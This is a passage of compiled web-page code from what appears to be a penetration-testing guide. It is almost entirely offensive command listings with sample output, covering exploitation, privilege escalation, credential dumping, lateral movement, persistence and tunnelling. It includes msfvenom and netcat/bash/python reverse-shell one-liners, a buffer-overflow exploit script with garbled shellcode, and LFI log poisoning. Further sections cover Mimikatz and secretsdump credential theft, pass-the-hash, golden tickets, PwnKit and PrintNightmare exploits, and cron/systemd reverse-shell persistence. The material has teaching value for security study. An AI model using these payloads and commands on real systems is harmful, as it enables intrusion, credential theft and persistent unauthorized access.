    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o payload.exe\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o payload.elf\nmsfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f raw -o payload.php\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -e x64/zutto_dekiru -i 5 -f exe -o encoded.exe\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Netcat Reverse Shell One-Liners:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "# Linux: nc -e /bin/sh 10.10.10.5 4444\n# Linux (no -e): rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.5 4444 >/tmp/f\n# Bash: bash -i >& /dev/tcp/10.10.10.5/4444 0>&1\n# Python: python -c 'import socket,s,o;s=socket.socket();s.connect((\"IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'\n# PHP: php -r '$sock=fsockopen(\"10.10.10.5\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n# Windows: nc.exe -e cmd.exe 10.10.10.5 4444\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Meterpreter Session Commands:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "meterpreter > sysinfo\n# Computer: ACME-WIN7, OS: Windows 7 SP1, Arch: x64\nmeterpreter > getuid\n# Server username: NT AUTHORITY\\SYSTEM\nmeterpreter > screenshot\nmeterpreter > keyscan_start / keyscan_dump\n# Captured: admin / P@ssw0rd!\nmeterpreter > hashdump\n# Administrator:fc525c9683e8fe067095ba2ddc971889\nmeterpreter > load kiwi\nmeterpreter > creds_all\n# Administrator P@ssw0rd! NTLM: fc525c...\nmeterpreter > getsystem (Named Pipe Impersonation)\nmeterpreter > migrate -N explorer.exe\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "SQLmap:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "sqlmap -u \"http://acme.com/page?id=1\" --dbs --dump\n# Database: acme_db, Table: users\n# admin / P@ssw0rd, jdoe / Summer24!, bob / 123456\n\nsqlmap -r request.txt --dbs\nsqlmap -u \"http://acme.com/page?id=1\" --os-shell\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Hydra:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh\n# [22][ssh] login: admin password: P@ssw0rd!\n\nhydra -l admin -P rockyou.txt 10.10.10.10 http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=Invalid\"\nhydra -L users.txt -P rockyou.txt ftp://10.10.10.10\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Password Cracking:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "john --wordlist=rockyou.txt hash.txt\n# P@ssw0rd! (Administrator), Summer2024! (jdoe)\nhashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r best64.rule\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Python Buffer Overflow Exploit:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-python",
        children: "#!/usr/bin/env python3\nimport socket\noffset = 1034\njmp_esp = b\"ó\u0012\u00171\"\nnop_sled = b\"\" * 32\nshellcode = b\"ÛÃÙt$ô\"  # msfvenom output\npayload = b\"A\" * offset + jmp_esp + nop_sled + shellcode\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.settimeout(10)\ns.connect((\"10.10.10.10\", 9999))\ns.send(payload + b\"\n\")\nprint(\"[+] Payload sent!\")\ns.close()\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "LFI to RCE (Log Poisoning):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "# LFI: http://acme.com/index.php?page=../../../../etc/passwd\n# Log Poisoning:\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://acme.com/\n# Execute:\ncurl \"http://acme.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id\"\n# uid=33(www-data) gid=33(www-data)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Web Exploitation:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "# SQLi: /api/user?id=1' OR '1'='1 (auth bypass)\n# Blind SQLi: /api/user?id=1' AND SLEEP(5)-- -\n# SSRF: /proxy?url=http://169.254.169.254/latest/meta-data/\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Password Spraying:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "crackmapexec smb 10.10.10.0/24 -u users.txt -p \"Summer2024!\" -d acme.com\n# [+] jdoe:Summer2024! (Pwn3d!)\ncrackmapexec smb 10.10.10.10 -u administrator -H fc525c9683e8fe067095ba2ddc971889 -x whoami\n# nt authority\\system\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "46-phase-5-post-exploitation",
      children: "4.6 Phase 5: Post-Exploitation"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Linux Privilege Escalation:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "SUID Bit Enumeration:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Find all SUID binaries\nfind / -perm -u=s -type f 2>/dev/null\n# Output:\n# /usr/bin/su\n# /usr/bin/passwd\n# /usr/bin/pkexec    # <--- interesting!\n# /usr/bin/sudo\n# /usr/lib/dbus-1.0/dbus-daemon-launch-helper\n# /usr/bin/pkexec\n# /sbin/mount.cifs\n# /sbin/mount.nfs\n\n# Check GTFOBins for SUID exploitation\n# pkexec vulnerability: CVE-2021-4034 (PwnKit)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "CVE-2021-4034 (PwnKit) Exploitation:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Download and compile exploit on target\nwget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c\ngcc cve-2021-4034.c -o exploit\n./exploit\n\n# Output:\n# [*] Spawning root shell via PwnKit (CVE-2021-4034)\n# [*] Generating payload...\n# [*] Triggering exploit...\n# # whoami\n# root\n# # id\n# uid=0(root) gid=0(root) groups=0(root)\n\n# Alternative: one-liner exploit using known shell\n# If we already have user access on the box:\necho 'chmod u+s /bin/bash' > /tmp/run.sh\nchmod +x /tmp/run.sh\n# Then if pkexec exists:\npkexec /tmp/run.sh\n/bin/bash -p\n# bash-4.4# whoami\n# root\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Cron Job Exploitation:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Check cron jobs\nls -la /etc/cron*\ncat /etc/crontab\n# Output:\n# SHELL=/bin/bash\n# PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n# * * * * * root /usr/local/bin/backup.sh\n\n# Check if we can write to the script\nls -la /usr/local/bin/backup.sh\n# -rwxrwxrwx 1 root root 45 Oct 15 14:30 /usr/local/bin/backup.sh\n# We can write to it!\n\n# Replace with reverse shell\necho '#!/bin/bash\nbash -i >& /dev/tcp/10.10.10.5/4444 0>&1' > /usr/local/bin/backup.sh\n\n# Wait for cron to trigger (within 1 minute)\n# Listener should catch root shell\n\n# Check world-writable directories in PATH\nfind / -writable -type d 2>/dev/null\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "LXD Container Escape:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Check if user is in lxd group\nid\n# uid=1000(user) gid=1000(user) groups=1000(user),999(lxd)\n\n# Import Alpine image and mount host filesystem\nlxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine\nlxc init alpine privesc -c security.privileged=true\nlxc config device add privesc host-root disk source=/ path=/mnt/root\nlxc start privesc\nlxc exec privesc /bin/sh\n# / # ls /mnt/root/\n# bin   dev  home  lib64  mnt  root  sbin  sys  usr\n# boot  etc  lib   media  opt  run   srv   tmp  var\n# / # cat /mnt/root/etc/shadow\n# root:$6$xyz...:19500:0:99999:7:::\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Kernel Exploit Enumeration (linux-exploit-suggester):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Clone and run on target\nwget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh\nchmod +x linux-exploit-suggester.sh\n./linux-exploit-suggester.sh\n\n# Output extract:\n# Kernel version: 4.4.0-116-generic\n# Architecture: x86_64\n# ========================\n# CVE-2017-16995  eBPF verifier   (kernel 4.4-4.14)\n# CVE-2017-1000112  UDP memory corruption (kernel 4.4-4.5)\n# CVE-2016-5195  DirtyCow        (kernel 2.6.22-4.8)\n# CVE-2021-4034  PwnKit          (pkexec)\n# CVE-2022-0847  DirtyPipe       (kernel 5.8-5.16)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Windows Privilege Escalation:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Token Impersonation:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "meterpreter > load incognito\n# Loading extension incognito...success.\n\nmeterpreter > list_tokens -u\n# Delegation Tokens Available\n# ========================================\n# ACME\\Administrator\n# ACME\\jdoe\n# NT AUTHORITY\\SYSTEM\n# \n# Impersonation Tokens Available\n# ========================================\n# ACME\\sqlservice\n# ACME\\iis_service\n\nmeterpreter > impersonate_token ACME\\\\Administrator\n# [+] Delegation token available\n# [+] Successfully impersonated ACME\\Administrator\n\nmeterpreter > getuid\n# Server username: ACME\\Administrator\n\nmeterpreter > rev2self\n# Back to original token\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Unquoted Service Paths:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Find unquoted service paths\nwmic service get name,displayname,pathname,startname | findstr /i /v \"C:\\Windows\\\\\"\n\n# Or using PowerUp.ps1\npowershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/PowerUp.ps1'); Get-ModifiableServiceFile\"\n\n# Example: service with unquoted path\n# Service: VulnService\n# Path: C:\\Program Files\\Vulnerable App\\Service.exe\n# StartName: LocalSystem\n\n# If \"C:\\Program Files\\Vulnerable\" is writable, create:\n# C:\\Program Files\\Vulnerable App.exe\n# This gets launched instead of the real service\n\n# Create malicious service binary\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4445 \\\n    -f exe -o \"C:\\Program Files\\Vulnerable App.exe\"\n\n# Restart service\nsc stop VulnService\nsc start VulnService\n\n# Meterpreter session received!\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "DLL Hijacking:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Find process loading DLLs from user-writable paths\n# Using Process Monitor, procmon finds missing DLLs quickly:\n# 1. Filter: Path contains .dll\n# 2. Filter: Result is \"NAME NOT FOUND\"\n# 3. Find writable directory in search order\n\n# Create malicious DLL\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4446 \\\n    -f dll -o missing.dll\n\n# Place DLL in writable search path\ncopy missing.dll C:\\Users\\Public\\missing.dll\n\n# Wait for service to load DLL or manually restart\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "PrinterNightmare (CVE-2021-34527):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Check if vulnerable\ncrackmapexec smb 10.10.10.10 -u administrator -H fc525c... -M printnightmare\n\n# Exploit\ngit clone https://github.com/cube0x0/CVE-2021-1675.git\ncd CVE-2021-1675\n\n# Create malicious DLL\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4447 \\\n    -f dll -o evil.dll\n\n# Run exploit\npython3 CVE-2021-1675.py acme.com/administrator:fc525c...@10.10.10.10 \\\\\n    \\\\10.10.10.5\\share\\evil.dll\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "JuicyPotato/RoguePotato:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Requirements: SeImpersonatePrivilege enabled\nwhoami /priv\n# PRIVILEGES INFORMATION\n# ======================\n# Privilege Name                Description                          State\n# ============================= ==================================== =======\n# SeImpersonatePrivilege        Impersonate a client after           Enabled\n#                               authentication\n# SeAssignPrimaryTokenPrivilege Replace a process level token        Disabled\n\n# Download JuicyPotato\ncertutil -urlcache -f http://10.10.10.5/JuicyPotato.exe JP.exe\n\n# Execute as SYSTEM\nJP.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c whoami > C:\\users\\public\\whoami.txt\" -t *\ntype C:\\users\\public\\whoami.txt\n# nt authority\\system\n\n# Reverse shell as SYSTEM\nJP.exe -l 1337 -p c:\\windows\\system32\\nc.exe -a \"10.10.10.5 4448 -e cmd.exe\" -t *\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Windows Kernel Exploit Enumeration:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Windows Exploit Suggester\n# On Kali:\nwget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py\npython windows-exploit-suggester.py --database 2024-10-15-mssb.xlsx --systeminfo systeminfo.txt\n\n# Using Sherlock (on target)\npowershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/Sherlock.ps1'); Find-AllVulns\"\n\n# Output extract:\n# Title      : MS16-032: Secondary Logon Handle\n# CVE(s)     : CVE-2016-0099\n# Author(s)  : James Forshaw\n# Vuln Status: Appears Vulnerable\n# \n# Title      : MS17-010: SMB RCE\n# CVE(s)     : CVE-2017-0143\n# Author(s)  : Equation Group\n# Vuln Status: Appears Vulnerable\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Hash Dumping:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Mimikatz (full output)\nmimikatz.exe\nprivilege::debug\n# Output: Privilege '20' OK\n\nsekurlsa::logonpasswords\n# Output:\n# Authentication Id : 0 ; 123456 (00000000:0001e240)\n# Session           : Interactive from 2\n# User Name         : Administrator\n# Domain            : ACME\n# SID               : S-1-5-21-123456789-1234567890-1234567890-500\n# \n#     msv :\n#      [00000003] Primary\n#      * Username : Administrator\n#      * Domain   : ACME\n#      * NTLM     : fc525c9683e8fe067095ba2ddc971889\n#      * SHA1     : a60885ffa159a0664475c2b410ce3cb59317d7c0\n#      * DPAPI    : a1b2c3d4e5f6089abcdef0123456789\n#     tspkg :\n#      * Username : Administrator\n#      * Domain   : ACME\n#      * Password : P@ssw0rd2024!\n#     wdigest :\n#      * Username : Administrator\n#      * Domain   : ACME\n#      * Password : P@ssw0rd2024!\n#     kerberos :\n#      * Username : administrator\n#      * Domain   : ACME.COM\n#      * Password : P@ssw0rd2024!\n#     ssp :\n#     credman :\n# \n# Authentication Id : 0 ; 99999 (00000000:0001869f)\n# Session           : Service from 0\n# User Name         : sql_svc\n# Domain            : ACME\n# NTLM              : e19ccf75ee54e06b06a5907af13cef42\n\n# Dump all credentials\nsekurlsa::minidump lsass.dmp\nsekurlsa::logonPasswords full\n\n# DCSync attack (if we have replication rights)\nlsadump::dcsync /domain:acme.com /user:krbtgt\n# Output:\n# 44534f9d8a26e7bc9d6e089fc3456789 xxxxxxxx xxxxxxxx xxxxxxxx\n# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::\n\n# Dump SAM\ntoken::elevate\nlsadump::sam\n# Output:\n# RID       : 000001f4 (500)\n# User      : Administrator\n# LM Hash   : aad3b435b51404eeaad3b435b51404ee\n# NT Hash   : fc525c9683e8fe067095ba2ddc971889\n\n# Golden Ticket creation\nkerberos::golden /user:Administrator /domain:acme.com /sid:S-1-5-21-123456789-1234567890-1234567890 /krbtgt:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /id:500 /ptt\nmisc::cmd\n\n# Dump LSA secrets\nlsadump::secrets\n# Output:\n# [machine] SECRET\\$MACHINE.ACC:plain_password_hex:...\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "impacket-secretsdump:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Remotely dump hashes (no agent needed)\nimpacket-secretsdump acme.com/Administrator:P@ssw0rd2024\\!@10.10.10.10\n\n# Output:\n# Impacket v0.12.0 - Copyright 2022 Fortra\n# [*] Service RemoteRegistry is in stopped state\n# [*] Service RemoteRegistry is disabled, enabling it\n# [*] Target system bootKey: 0x12a34bc56d789ef012abc3d45678e90f\n# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\n# Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::\n# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n# [*] Dumping cached domain logon info (uid:encryptedHash:longDomain:domain)\n# administrator:ACME.COM:$DCC2$10240#administrator#xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx::\n# [*] Dumping LSA Secrets\n# $MACHINE.ACC: plain_password_hex:6f726231...\n# NL$KM: 1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef\n# [*] Dumping DPAPI secrets\n# dpapi_machinekey:0x1234567890abcdef0x1234567890abcdef\n# dpapi_userkey:0x1234567890abcdef0x1234567890abcdef\n# [*] Cleaning up...\n\n# Pass-the-hash with impacket\nimpacket-wmiexec -hashes :fc525c9683e8fe067095ba2ddc971889 Administrator@10.10.10.10\nimpacket-psexec -hashes :fc525c9683e8fe067095ba2ddc971889 Administrator@10.10.10.10\nimpacket-smbexec -hashes :fc525c9683e8fe067095ba2ddc971889 Administrator@10.10.10.10\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Lateral Movement:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# PSExec (Windows)\npsexec \\\\\\\\DC01 -u administrator -p P@ssw0rd! -s cmd.exe\n\n# PSExec from impacket\nimpacket-psexec acme.com/administrator:P@ssw0rd!@10.10.10.11\n\n# WinRM\nwinrs -r:DC01 -u:administrator -p:P@ssw0rd! ipconfig\n\n# WinRM with crackmapexec\ncrackmapexec winrm 10.10.10.10 -u administrator -H fc525c9683e8fe067095ba2ddc971889 -x whoami\n\n# WMI with wmic\nwmic /node:DC01 /user:administrator /password:P@ssw0rd! process call create \"cmd.exe /c whoami > C:\\tmp\\out.txt\"\n\n# WMI with impacket\nimpacket-wmiexec acme.com/administrator:P@ssw0rd!@10.10.10.11\n\n# SMB exec via net use\nnet use \\\\\\\\DC01\\\\admin$ /user:acme\\\\administrator P@ssw0rd!\ncopy payload.exe \\\\\\\\DC01\\\\admin$\\\\temp\\\\payload.exe\nwmic /node:DC01 process call create \"C:\\\\Windows\\\\temp\\\\payload.exe\"\n\n# SSH key-based lateral movement\nssh-copy-id -i ~/.ssh/id_rsa.pub user@10.10.10.12\nssh user@10.10.10.12\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Persistence Mechanisms:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Linux Cron\n(crontab -l 2>/dev/null; echo \"*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.5/4449 0>&1'\") | crontab -\n\n# Linux systemd service\ncat > /etc/systemd/system/update.service << 'EOF'\n[Unit]\nDescription=System Update Service\n[Service]\nType=simple\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.5/4449 0>&1'\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF\n\nsystemctl enable update.service\nsystemctl start update.service\n\n# SSH authorized_keys\nmkdir -p ~/.ssh && chmod 700 ~/.ssh\necho \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...\" >> ~/.ssh/authorized_keys\nchmod 600 ~/.ssh/authorized_keys\n\n# Windows Registry Run Keys\nreg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Update /t REG_SZ /d \"C:\\Users\\Public\\payload.exe\"\n\n# Windows Scheduled Task\nschtasks /create /tn \"SystemUpdate\" /tr \"C:\\Users\\Public\\payload.exe\" /sc hourly /ru SYSTEM\n\n# Windows Startup folder\ncopy payload.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe\"\n\n# WMI Event Subscription (stealthy)\npowershell -Command \"\nRegister-WmiEvent -Query \\\"SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'\\\" -Action {\n    Invoke-WmiMethod -Path (New-Object System.Management.ManagementPath('Win32_Process')) -Name Create -ArgumentList 'C:\\Users\\Public\\payload.exe'\n}\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "47-phase-6-pivoting-and-tunneling",
      children: "4.7 Phase 6: Pivoting and Tunneling"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "SSH Tunneling:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Local port forwarding (access internal service via SSH)\nssh -L 8080:internal-web.acme.com:80 user@pivot-host.acme.com\n# Now http://localhost:8080 goes to internal-web:80 via pivot\n\n# Remote port forwarding (expose internal service externally)\nssh -R 9999:localhost:3389 user@external-server.acme.com\n# Now external-server:9999 → localhost:3389 (RDP)\n\n# Dynamic SOCKS proxy\nssh -D 1080 user@pivot-host.acme.com\n# Configure tools to use SOCKS5 proxy at localhost:1080\n# All traffic routes through pivot host\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Chisel (Fast TCP Tunneling):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Server (Kali - attacker)\nchisel server -p 8000 --reverse\n\n# Client (compromised host - internal)\nchisel client 10.10.10.5:8000 R:1080:socks\n\n# Now use SOCKS5 proxy on Kali at localhost:1080\n# All traffic goes through the compromised host's network\n\n# Port forwarding via chisel\nchisel client 10.10.10.5:8000 R:3389:10.10.10.100:3389\n# Kali localhost:3389 → chisel → compromised host → internal 10.10.10.100:3389\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Socat:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Port forwarding\nsocat TCP-LISTEN:4444,fork TCP:10.10.10.100:3389\n\n# Relay traffic through a dual-homed host\nsocat TCP-LISTEN:8080,fork TCP:10.10.20.50:80\n\n# Bind shell relay\nsocat TCP:10.10.10.5:4444 EXEC:/bin/sh\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Meterpreter Routing:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "meterpreter > run autoroute -s 10.10.20.0/24\n# [*] Adding a route to 10.10.20.0/24...\n# [+] Added route to 10.10.20.0/24 via 10.10.10.10\n\nmeterpreter > run autoroute -p\n# Active Routing Table\n# ====================\n#    Subnet           Netmask          Gateway\n#    ------           -------          -------\n#    10.10.20.0       255.255.255.0    Session 1\n\n# Now we can scan the internal network through the pivot\nmsf6 auxiliary/scanner/portscan/tcp\n> set RHOSTS 10.10.20.50\n> set PORTS 80,443,3389,445\n> run\n\n# [*] 10.10.20.50:80 - TCP OPEN\n# [*] 10.10.20.50:445 - TCP OPEN\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Ligolo-ng (Advanced Tunneling):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# On attacker machine\nsudo ip tuntap add mode tun ligolo\nsudo ip link set dev ligolo mtu 1500\nsudo ip addr add 240.0.0.1/32 dev ligolo\nsudo ip link set dev ligolo up\n\n# Start ligolo proxy\nligolo-proxy -self-cert -laddr 0.0.0.0:7000\n\n# On compromised target\nligolo-agent -connect 10.10.10.5:7000 -ignore-cert\n\n# Back on attacker (ligolo proxy session)\nligolo-proxy > session\n# (Interactive session selection)\nligolo-proxy > ifconfig\n# (Shows target network interfaces)\nligolo-proxy > start\n# Tunnel active, we can reach target's internal networks\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "48-phase-7-c2-frameworks",
      children: "4.8 Phase 7: C2 Frameworks"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Cobalt Strike Overview:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Cobalt Strike operates with a team server (Linux) and clients (Windows/Linux). The flow:"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
